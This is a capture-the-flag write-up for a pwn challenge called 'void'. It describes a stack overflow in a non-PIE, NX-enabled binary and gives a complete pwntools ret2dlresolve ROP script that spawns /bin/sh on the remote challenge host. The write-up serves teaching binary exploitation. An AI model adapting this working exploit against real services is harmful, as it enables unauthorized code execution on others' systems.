# Void
**Date**: 2025-05-18
**Category**: Pwn

## Table of Contents
- [Summary](#summary)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Exploitation](#exploitation)
- [Takeaways & Lessons Learned](#takeaways--lessons-learned)

---

## Summary
A pwn challenge called void that doesn’t respond locally forces us into a reverse-shell exploit using a ret2dlresolve ROP chain against a non-PIE, NX-enabled binary with partial RELRO and no canary.

---

## Reconnaissance & Enumeration
Files:
    void (binary)
    glibc folder (custom libc & loader)
    flag.txt (dummy)

Behavior:
    ./void and nc host port yield no output—“void” lives up to its name.
    Disassembly reveals main() immediately calls vuln().

Vulnerability:
    In vuln(), a 64-byte stack buffer is overrun by read(fd=0, buf, 200).

Protections (checksec):
    Partial RELRO → GOT partly writable
    No canary → stack overflow OK
    NX enabled → no shellcode on stack
    No PIE → fixed addresses for ROP

---

## Exploitation
1. Offset discovery
    Generate a 1 kB cyclic pattern in GDB
    Crash and inspect rsp vs. rbp → offset = 72 bytes

2. Craft ret2dlresolve payload
    Target symbol: system("/bin/sh")
    Build ROP:


```python
from pwn import *

void   = ELF("void")
libc   = ELF("glibc/libc.so.6")
ld     = ELF("glibc/ld-linux-x86-64.so.2")
context.binary = void.path

rop      = ROP(void)
resolver = Ret2dlresolvePayload(void, symbol="system", args=["/bin/sh"])
rop.read(0, resolver.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(resolver)
chain = rop.chain()

p = remote("83.136.250.158", 39848)
p.sendline(b"A"*72 + chain)
p.sendline(resolver.payload)
p.interactive()

```
3. 
Now it was time to execute. I ran the script and obtained the reverse shell on remote, and did simple lookups to find flag.txt

## Takeaways & Lessons Learned
- Dynamic linking hacks: ret2dlresolve lets you call libc functions even with NX+partial RELRO.
- ROP basics: chain gadgets to call read(), pivot stack into your fake resolver structures, then invoke system().
- Binary protections matter: knowing which defenses are present (or absent) guides your exploit choice.
- Offset finding: GDB’s cyclic patterns remain the quickest way to pinpoint overflow lengths.